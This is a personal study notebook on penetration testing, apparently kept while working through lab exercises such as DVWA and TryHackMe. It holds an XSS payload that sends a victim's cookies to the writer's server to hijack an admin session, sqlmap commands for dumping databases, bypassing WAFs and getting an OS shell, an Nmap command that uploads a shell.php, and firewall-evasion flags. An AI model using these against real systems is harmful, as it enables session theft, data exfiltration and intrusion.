# JAN
## 14
### Additional Flags to Prevent Cookie Manipulation
- httpOnly flag
- secure flag

### document.location
- Also window.location - represents the URL of the webpage

### Cookie Stealing Using A Web Server
```javascript
<script>document.location='http://your ip/cookiestealer.php?c='+document.cookie;</script>
```

**Motivation:** Uploading a malicious JS script so that an admin views it and his cookies are sent to my server so that I can hijack his session. <br>
**Note:** All session tokens are cookies but no all cookies are session tokens.

## 15
https://www.stationx.net/sqlmap-cheat-sheet/
### SQLMAP
- 6 Techniques
- `--crawl 3` : Depth -> 3
- `--batch` : Default
- `--technique="U"` : Union Attack
- `--threads` : Saves time
- `--risk 1/2/3`
- `--level 1/2/3/4/5` : Increases range of vulnerabilites/Increases false positive
- `-V 1/2/3/4/5`
- ![image](https://github.com/PranjalBasak/Documentation/assets/66166653/9b1f8674-9aa1-44b7-9c7f-ca4a83f87839)

- `--current-user`
- `--current-db`
- `--hostname`
- `--dbs` : Show all Database details
- `-D <database_name> --tables` : Show tables
- `-T <table_name> --dump` : Show data of `<table_name>`
- `-D <db> -T <table> --columns` : Show all the columns of `<table>`
- `-D <db> --dump-all` : Dump all the data of database `<db>`
- `--output-dir=<url>`
- `--headers="Referer:abc.com" -v 4 --batch`
- `--user-agent="GECKO_Chrome" -v 4 --batch`
- `--mobile -v 4 --batch` : Pretending to be a mobile user agent
- `--list-tampers` : Lists WAF Bypass Techniques
- `--tamper=base64encode -v 3 --batch`
- `--forms`: Sends data to a form
- `--data="uname=abc&pass=abc&login=submit" --dbs`
- `--proxy="127.0.0.1:4444"` : Can use burpsuite
- `-r abc --batch`
-  `--cookie`
-  `--flush-session` : Clears SQLi sessions so that we can use new payloads
-  `--comment` : Brings hidden comments
-  `--os-shell` : Brings command shell
-  `--os-cmd`

## 16 Jan

```bash
docker run --rm -it -p 80:80 vulnerables/web-dvwa
```

```bash
python3 /bin/sqlmap/sqlmap.py
```

Resources to Learn and Practice
https://nmap.org/book/man.html
https://nmap.org/docs.html
https://hackertarget.com/nmap-cheatsheet-a-quick.../
https://hackertarget.com/nmap-tutorial/
https://www.stationx.net/nmap-cheat-sheet/
https://media.x-ra.de/doc/NmapCheatSheetv1.1.pdf
https://www.100security.com.br/netdiscover
https://kalilinuxtutorials.com/netdiscover-scan-live.../
https://www.youtube.com/watch?v=PS677owUk-c
https://www.stationx.net/nmap-cheat-sheet/
https://redteamtutorials.com/2018/10/14/nmap-cheatsheet/
https://resources.infosecinstitute.com/nmap-cheat-sheet/...
https://medium.com/.../nmap-cheat-sheet-nmap-scanning...
[https://resources.infosecinstitute.com/network.../...
](https://resources.infosecinstitute.com/network-discovery-tool/?fbclid=IwAR0SzhZwp6lbIuxRzjcyxREzOcdN5J1wyvCu4RpnkBEYZPKogLl9YDmb3wQ#gref)https://resources.infosecinstitute.com/network-discovery-tool/?fbclid=IwAR0SzhZwp6lbIuxRzjcyxREzOcdN5J1wyvCu4RpnkBEYZPKogLl9YDmb3wQ#gref
0x207c20


## 17 Jan
`chmod 1777`
- 1 : Sticky Bit -> Allows the deletion of a file within a directory
- 2 : SGID -> Set GID Bit -> Gives the files within the directory the group owner of the directory rather than the group owner of the file
- 3 : SUID -> Set UID Bit -> Used for Scripts to allow them to use sudo privileges
### Useful Commands
- `umask 0777` : Remove all of rwx permission from ugo
- `chgrp <group> <file/dir>` : Change the group of a file or directory
- `touch dir/{1,2,3}`
- `dpkg -l`
- `dpkg -s <pkg_name>`
- `apt-cache search <description of the pkg>` : Look for a package to install

[Bash Scripting CheatSheet](https://devhints.io/bash)

## 18 Jan
- httpd is the same as apache2

### Netstat Cheatsheet: Display TCP and UDP Connections

## Command:
```bash
netstat -tulpen
```

## Options:
- **`-t`**: Display TCP connections.
- **`-u`**: Display UDP connections.
- **`-l`**: Display listening sockets.
- **`-p`**: Show the process ID and name for the involved programs.
- **`-e`**: Display additional information. (Note: This might be replaced by `-n` for faster output without hostname resolution.)

## Example Output:
```bash
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       User       Inode      PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      0          123456     789/sshd
tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      0          789012     1234/postgres
udp        0      0 0.0.0.0:123             0.0.0.0:*                           0          567890     456/ntpd
...
```

### Scoring Vulnerabilities
- CVSS (Common Vulnerability Scoring System)
- VPR (Vulnerability Priority Rating)

### Vulnerability Databases
1. [NVD (National Vulnerability Database)](https://nvd.nist.gov/vuln)
2. [Exploit-DB](http://exploit-db.com/)

In cybersecurity, vulnerabilities are classified under **“Common Vulnerabilities and Exposures”** (Or CVE for short).
These CVEs have the formatting of `CVE-YEAR-IDNUMBER`. For example, the vulnerability that the famous malware WannaCry used was `CVE-2017-0144`.

### Nmap Port Scan Types

When port scanning with Nmap, there are three basic scan types:

1. **TCP Connect Scans (-sT):** Establishes a full connection to the target's ports.

2. **SYN "Half-open" Scans (-sS):** Initiates a SYN scan, also known as a stealth scan, by sending SYN packets to target ports.

3. **UDP Scans (-sU):** Focuses on UDP ports, which are connectionless and less reliable than TCP.

Additionally, there are several less common port scan types:

- **TCP Null Scans (-sN):** Sends packets with no TCP flags set.

- **TCP FIN Scans (-sF):** Sends packets with only the FIN flag set.

- **TCP Xmas Scans (-sX):** Sends packets with the FIN, PSH, and URG flags set, creating a "Christmas tree" pattern.

**Open Port:**

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/6de32c6e-560e-4ac2-ad40-e37210261850)

**Closed Port:**

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/baabe6c2-77a6-437e-8629-4b0670976922)

***SYN Scan:*** Half-Open Scan/Stealth Scan

![image](https://github.com/PranjalBasak/Documentation/assets/66166653/626b837d-8b2e-41ae-92e0-6424fc1f862e)

**Note:** SYN scans are the default scans used by Nmap if run with sudo permissions. If run without sudo permissions, Nmap defaults to the TCP Connect scan

## 19 Jan
`sudo netdiscover -i eth0` : Using ARP to scan hosts in a network using network interface `eth0`




## Find resource permissions by using absolute mode

The most fundamental permissions search uses no additional parameters. The statement reads as "find a resource with these permissions."

For example:

```bash
# find /etc -perm 777
```

The command is: Search the `/etc` directory for resources with the 777 access level (rwx for all identities).

The above example only finds resources with exactly the specified permission—no more and no less. What if you need a little more flexibility? There are two additional parameters that can be very useful. The first is the `-` character (dash), and the second is the `/` character (slash). Let's look at both.

### Find by `-`

The use of the `-` option means "at least this permission level is set, and any higher permissions."

Example:

```bash
# find . -perm -644
# Permission 644 or higher
```

This example displays all resources in the current directory with at least 644 permissions. That means the file must have read and write access for the file owner, write access for the group ownder and write access for others. This is the bare minimum but higher permission is welcome.

### Find by `/`

The use of the `/` option means "any of the permissions listed are set." (either or relationship)

Example:

```bash
# find . -perm /644
```
Here, the files can be either read and writtable by the owner (6) or writtable by the group owner (4) or writtable by others (4). All of these conditions do not necessarily be true together. As long as any of them is true, it should be enough.

Certainly! Here's your text formatted for GitHub Markdown:

```markdown
## Find Files Based on Their Permissions Using Symbolic Notation

In the following examples, we use symbolic notations such as `u` (for user), `g` (group), `o` (others). We can also use the letter `a` to represent all three of these categories. The permissions can be specified using letters `r` (read), `w` (write), `x` (executable).

For instance, to find any file with group write permission, run:

```bash
$ find . -perm -g=w
```

As you see in the above example, `file1` and `file2` have group write permission. Please note that you can use either "=" or "+" operators for symbolic notation. For example, the following two commands will do the same thing.

```bash
$ find . -perm -g=w
$ find . -perm -g+w
```

To find any file that is writable by the file owner, run:

```bash
$ find . -perm -u=w
```

To find any file that is writable by all (the file owner, group, and everyone else), run:

```bash
$ find . -perm -a=w
```

To find files that are writable by both their owner and their group, use this command:

```bash
$ find . -perm -g+w,u+w
```

The above command is equivalent to the "find . -perm -220" command.

To find files that are writable by either their owner or their group, run:

```bash
$ find . -perm /u+w,g+w
```

Or,

```bash
$ find . -perm /u=w,g=w
```

Feel free to copy and paste this into your GitHub Markdown section!

## Passive Reconnaissance
- whois
- nslookup
- dig

`whois domain`
`nslookup -type=A tryhackme.com 1.1.1.1`
`dig @1.1.1.1 tryhackme.com MX`

## Nmap
### UDP Scan
- If a port is open -> The target returns nothing, and Nmap considers the port open|filtered
- If a port is closed -> The target returns an ICMP packet to signal that the port is closed
- Since UDP scan is slow, it is better to scan top 20 well-known ports
```bash
nmap -sU --top-ports 20 <target>
```

- NULL -> No Flag
- FIN -> FIN Flag
- XMAS -> FIN,PSH,URG Flag

All of these three scans except closed ports to respond with RST flag, however, the open ports will behave the same as UDP scan.

**Goal:** The goal of these three scans is to bypass firewall, since many firewalls are configured to drop TCP packets if the ports are closed. However, modern IDS solutions will easily evade these scans.

**Note:** Microsoft Windows and many CISCO devices will respond with an RST flag for NULL, FIN and XMAS scans regardless of the p is open or not.

### Ping Sweep
- `nmap -sn 192.168.0.0/24` : Scan 192.168.0.x
- `nmap -sn 192.168.0.0/16` : Scan 192.168.x.x

The -sn switch tells Nmap not to scan any ports -- forcing it to rely primarily on ICMP echo packets (or ARP requests on a local network, if run with sudo or directly as the root user) to identify targets. In addition to the ICMP echo requests, the -sn switch will also cause nmap to send a TCP SYN packet to port 443 of the target, as well as a TCP ACK (or TCP SYN if not run as root) packet to port 80 of the target.

## NSE (Nmap Scripting Engine)
There are many categories available. Some useful categories include:

safe:- Won't affect the target
- intrusive:- Not safe: likely to affect the target
- vuln:- Scan for vulnerabilities
- exploit:- Attempt to exploit a vulnerability
- auth:- Attempt to bypass authentication for running services (e.g. Log into an FTP server anonymously)
- brute:- Attempt to bruteforce credentials for running services
- discovery:- Attempt to query running services for further information about the network (e.g. query an SNMP server).
A more exhaustive list can be found [here](https://nmap.org/book/nse-usage.html).

`--scirpt=<script_name>`
`--script=smb-enum-users,smb-enum-shares`
`nmap -p 80 --script http-put --script-args http-put.url='/dav/shell.php',http-put.file='./shell.php'`
`nmap --script-help <script-name>`

## Firewall Evasion
`-Pn` : Do not bother pinging before scanning targets
- `-f`:- Used to fragment the packets (i.e. split them into smaller pieces) making it less likely that the packets will be detected by a firewall or IDS.
- An alternative to -f, but providing more control over the size of the packets: `--mtu <number>`, accepts a maximum transmission unit size to use for the packets sent. This must be a multiple of 8.
- `--scan-delay <time>ms`:- used to add a delay between packets sent. This is very useful if the network is unstable, but also for evading any time-based firewall/IDS triggers which may be in place.
- `--badsum`:- this is used to generate in invalid checksum for packets. Any real TCP/IP stack would drop this packet, however, firewalls may potentially respond automatically, without bothering to check the checksum of the packet. As such, this switch can be used to determine the presence of a firewall/IDS.

[Detailed Firewall Evasion](https://nmap.org/book/man-bypass-firewalls-ids.html)

- Find NSE scripts: `/usr/share/nmap/scripts/*<search>*` or search online
